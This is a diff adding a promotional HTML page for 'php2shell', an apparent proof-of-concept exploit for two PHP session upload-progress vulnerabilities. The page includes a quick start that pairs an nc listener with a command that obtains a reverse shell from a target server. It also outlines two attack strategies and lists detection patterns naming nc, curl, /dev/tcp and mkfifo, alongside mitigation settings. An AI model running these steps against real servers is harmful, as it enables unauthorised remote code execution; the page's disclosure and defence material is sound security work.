@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>php2shell — Pre-auth RCE &amp; reverse shell for CVE-2026-109618 / CVE-2026-109619</title>
+<meta name="description" content="Proof-of-concept exploit for CVE-2026-109618 and CVE-2026-109619: unauthenticated remote code execution in PHP core through the session upload-progress handler. One URL in, a reverse shell out.">
+<meta name="keywords" content="CVE-2026-109618, CVE-2026-109619, php2shell, PHP, remote code execution, RCE, reverse shell, pre-auth, exploit, proof of concept, use-after-free, heap UAF, session fixation, security research, pentest, vulnerability">
+<meta name="author" content="Whackermelon">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://whackermelon.github.io/Php2Shell-POC/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="php2shell — Pre-auth RCE &amp; reverse shell for CVE-2026-109618 / CVE-2026-109619">
+<meta property="og:description" content="Unauthenticated remote code execution in PHP core through the session upload-progress handler. One URL in, a reverse shell out.">
+<meta property="og:url" content="https://whackermelon.github.io/Php2Shell-POC/">
+<meta property="og:image" content="https://raw.githubusercontent.com/Whackermelon/Php2Shell-POC/main/.github/assets/preview.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="php2shell — CVE-2026-109618 / CVE-2026-109619">
+<meta name="twitter:description" content="Pre-auth RCE &amp; reverse shell PoC for the two critical PHP core vulnerabilities.">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Whackermelon/Php2Shell-POC/main/.github/assets/preview.png">
+<link rel="icon" href="https://raw.githubusercontent.com/Whackermelon/Php2Shell-POC/main/.github/assets/preview.png">
+<style>
+  :root{
+    --bg:#0d0f14; --panel:#151922; --line:#242b38;
+    --fg:#e8ecf3; --muted:#98a3b6; --green:#34a853; --red:#e22d39; --yellow:#f2d64b;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);
+       font:16px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  .wrap{max-width:900px;margin:0 auto;padding:0 22px 72px}
+  header{padding:56px 0 30px;border-bottom:1px solid var(--line)}
+  h1{font-size:2.6rem;margin:0 0 6px;letter-spacing:-.02em}
+  h1 .g{color:var(--green)} h1 .r{color:var(--red)}
+  .sub{color:var(--muted);font-size:1.12rem;margin:0 0 18px}
+  .cves{display:flex;gap:10px;flex-wrap:wrap;margin:18px 0 0}
+  .cve{background:rgba(226,45,57,.12);border:1px solid rgba(226,45,57,.45);
+       color:#ff8a92;padding:4px 12px;border-radius:999px;font-size:.9rem;font-weight:600}
+  .tag{display:inline-block;background:var(--panel);border:1px solid var(--line);
+       color:var(--muted);padding:3px 11px;border-radius:999px;font-size:.82rem;margin:3px 6px 3px 0}
+  .tag b{color:var(--fg);font-weight:600}
+  h2{font-size:1.28rem;margin:38px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--line)}
+  pre{background:var(--panel);border:1px solid var(--line);border-radius:10px;
+      padding:14px 16px;overflow-x:auto;font:14px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+  code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+  p code{background:var(--panel);border:1px solid var(--line);border-radius:5px;padding:1px 5px;font-size:.92em}
+  a{color:#7ee787}
+  .btns{margin:24px 0 8px;display:flex;gap:12px;flex-wrap:wrap}
+  .btn{display:inline-block;background:var(--panel);border:1px solid var(--line);
+       color:var(--fg);text-decoration:none;padding:10px 18px;border-radius:9px;font-weight:600}
+  .btn:hover{border-color:#3b4a5f}
+  .btn.p{background:var(--green);border-color:var(--green);color:#06240f}
+  table{border-collapse:collapse;width:100%;margin:10px 0}
+  th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top;font-size:.93rem}
+  th{background:var(--panel);color:var(--muted);font-weight:600}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:14px}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:15px 17px}
+  .card h3{margin:0 0 7px;font-size:1rem}
+  .card p{margin:0;color:var(--muted);font-size:.92rem}
+  footer{margin-top:52px;padding-top:20px;border-top:1px solid var(--line);color:var(--muted);font-size:.87rem}
+  .warn{border-left:3px solid var(--yellow);background:rgba(242,214,75,.07);padding:11px 15px;margin:16px 0;border-radius:0 8px 8px 0}
+  .melon{font-size:2.4rem;line-height:1;margin-bottom:12px}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <div class="melon">🍉</div>
+  <h1><span class="g">php</span><span class="r">2shell</span></h1>
+  <p class="sub">Pre-auth remote code execution &amp; reverse shell for the two critical PHP core
+     vulnerabilities patched on 2026-10-21.</p>
+  <div class="cves">
+    <span class="cve">CVE-2026-109618 — RCE via OOM corruption</span>
+    <span class="cve">CVE-2026-109619 — RCE via stale global state</span>
+  </div>
+  <p style="margin-top:16px">
+    <span class="tag"><b>CVSS v4.0</b> 9.2 Critical</span>
+    <span class="tag"><b>Auth</b> none</span>
+    <span class="tag"><b>Affected</b> PHP 5.4 → 8.5.x</span>
+    <span class="tag"><b>Fixed in</b> 8.5.12 · 8.4.27 · 8.3.36 · 8.2.35</span>
+    <span class="tag"><b>Dependencies</b> none</span>
+  </p>
+  <div class="btns">
+    <a class="btn p" href="https://github.com/Whackermelon/Php2Shell-POC">★ Star on GitHub</a>
+    <a class="btn" href="https://github.com/Whackermelon/Php2Shell-POC">Source &amp; documentation</a>
+    <a class="btn" href="https://github.com/Whackermelon/Php2Shell-POC/issues">Report an issue</a>
+  </div>
+</header>
+
+<h2>Quick start</h2>
+<pre><code># terminal 1
+nc -lvnp 4444
+
+# terminal 2
+python3 php2shell.py https://target.example.com/index.php -l 10.0.0.5 -p 4444</code></pre>
+
+<p>One URL in, a reverse shell out. Python 3.8+, standard library only — no dependency,
+   no build step, no target-side helper file.</p>
+
+<h2>The two bugs</h2>
+<table>
+  <tr><th>CVE</th><th>Title</th><th>Summary</th></tr>
+  <tr>
+    <td><b>CVE-2026-109618</b></td>
+    <td>RCE via OOM corruption</td>
+    <td>An out-of-memory condition can interrupt PHP while internal request data is only
+        partially initialised. Request cleanup may then treat the invalid data as valid.</td>
+  </tr>
+  <tr>
+    <td><b>CVE-2026-109619</b></td>
+    <td>RCE via stale global state</td>
+    <td>Request-owned internal state can survive after its backing memory has been freed.
+        A later request handled by the same worker may use that stale state before normal
+        initialisation resets it.</td>
+  </tr>
+</table>
+
+<h2>Mechanism</h2>
+<p>The reachable surface is the session upload-progress handler in
+   <code>ext/session/session.c</code>, which has three independent problems:</p>
+<div class="grid">
+  <div class="card">
+    <h3>1 · Session fixation (pre-auth)</h3>
+    <p><code>MULTIPART_EVENT_FORMDATA</code> copies the POST-body field whose name is PHP's
+       <code>session.name</code> into the progress session id, <b>ignoring</b>
+       <code>session.use_only_cookies</code>. The attacker picks the session id, and
+       therefore the on-disk session file path.</p>
+  </div>
+  <div class="card">
+    <h3>2 · Unvalidated file name</h3>
+    <p><code>MULTIPART_EVENT_FILE_START</code> stores the <b>raw</b> uploaded file name into
+       the session data, with no sanitisation at all.</p>
+  </div>
+  <div class="card">
+    <h3>3 · Attacker-controlled content</h3>
+    <p>The POST-body field named <code>PHP_SESSION_UPLOAD_PROGRESS</code> becomes the
+       session key <code>upload_progress_&lt;value&gt;</code>, stored <b>verbatim</b>.</p>
+  </div>
+</div>
+<p>Because the progress data is serialised into the attacker's own session file, and PHP's
+   session serialiser is not a sandbox, the attacker fully controls the <b>content</b> of a
+   file whose name is <b>fully predictable</b>:
+   <code>&lt;session.save_path&gt;/sess_&lt;chosen session id&gt;</code>.</p>
+
+<h2>Strategies</h2>
+<div class="grid">
+  <div class="card">
+    <h3>Strategy 1 — session poisoning + inclusion sink</h3>
+    <p>The progress key can carry a complete <code>&lt;?php ... ?&gt;</code> block, and the
+       <code>php</code> session serialiser writes it verbatim. An <code>include()</code>/
+       <code>require()</code> sink then executes it. Works against any target with such a
+       sink, and needs no knowledge of the target's PHP build.</p>
+  </div>
+  <div class="card">
+    <h3>Strategy 2 — serialiser handler mismatch</h3>
+    <p>When two directories use different <code>session.serialize_handler</code> values, a
+       file name containing <code>|</code> shifts the parse so attacker bytes are
+       deserialised as an object whose <code>__destruct</code> runs — even though the decode
+       returns FAILURE.</p>
+  </div>
+</div>
+
+<h2>Detection</h2>
+<p>Alert when a PHP worker process (<code>php-fpm</code>, <code>php-cgi</code>,
+   <code>lsphp</code>, <code>httpd</code>) spawns <code>/bin/sh</code>, <code>/bin/bash</code>,
+   <code>cmd.exe</code>, <code>python</code>, <code>curl</code>, <code>wget</code> or
+   <code>nc</code>, and when a command line contains <code>/dev/tcp/</code>,
+   <code>fsockopen</code> or <code>mkfifo</code>. Also grep the web access logs for
+   <code>PHP_SESSION_UPLOAD_PROGRESS</code>.</p>
+
+<h2>Mitigation</h2>
+<p>Update PHP to <b>8.5.12 / 8.4.27 / 8.3.36 / 8.2.35</b>. Until then, per the official
+   advisory:</p>
+<pre><code>; CVE-2026-109619 — blocks the confirmed session paths.
+; Set it before request parsing and RESTART every worker.
+session.upload_progress.enabled = 0
+
+; CVE-2026-109618 — removes the controllable memory-limit failure.
+memory_limit = -1
+post_max_size = 8M</code></pre>
+
+<div class="warn">
+  <b>Authorised security testing and education only.</b>
+  Use only against systems you own or have explicit written permission to test.
+</div>
+
+<footer>
+  <p>php2shell — by <a href="https://github.com/Whackermelon">Whackermelon</a> ·
+     <a href="https://github.com/Whackermelon/Php2Shell-POC">Source on GitHub</a> ·
+     MIT licensed.</p>
+  <p>Advisory references:
+     <a href="https://github.com/php/php-src">php-src</a> ·
+     <a href="https://watchtowr.com/intelligence/php-cve-2026-109618-faq/">watchTowr</a> ·
+     <a href="https://sansec.io/research/php2shell">sansec</a> ·
+     <a href="https://cert.europa.eu/publications/security-advisories/2026-018/">CERT-EU</a>
+  </p>
+</footer>
+
+</div>
+</body>
+</html>
